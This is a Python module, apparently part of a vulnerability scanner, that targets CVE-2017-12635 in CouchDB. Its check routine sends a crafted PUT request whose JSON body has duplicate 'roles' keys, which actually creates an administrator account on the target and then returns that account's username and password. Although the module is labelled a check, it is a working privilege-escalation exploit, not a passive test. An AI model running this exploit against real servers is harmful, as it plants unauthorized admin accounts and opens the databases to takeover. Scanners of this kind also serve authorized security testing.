#!/usr/bin/env python3

import re
import json
from app.lib.request import request
from app.lib.common import get_capta

class CVE_2017_12635_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2017-12635漏洞',
            'description': 'CVE-2017-12635垂直越权漏洞,可以让任意用户创建管理员,影响范围为: CouchDB <1.7.0以及CouchDB <2.1.1',
            'date': '2017-08-07',
            'exptype': 'check',
            'type': '垂直越权'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta()
        self. headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Content-Type": "application/json"
        }
        self.data = '''{"type": "user","name": \"''' + self.capta + '''\","roles": ["_admin"],"roles": [],"password": \"''' +  self.capta + '''\"}'''
        self.login_data = {
            "name": self.capta,
            "password": self.capta
        }

    async def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            req = await request.put(self.url + "/_users/org.couchdb.user:" + self.capta, data = self.data, headers = self.headers)
            self.headers["Content-Type"] = "application/x-www-form-urlencoded;charset=UTF-8"
            if req.status == 201 and json.loads(await req.text())['ok'] == True:
                # print("存在CVE-2017-12635漏洞,添加的账号和密码为:", self.capta, self.capta)
                return True, "存在CVE-2017-12635漏洞,添加的账号和密码为:"  + self.capta + ':' + self.capta
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    CVE_2017_12635 = CVE_2017_12635_BaseVerify('http://127.0.0.1:5984')
    CVE_2017_12635.check()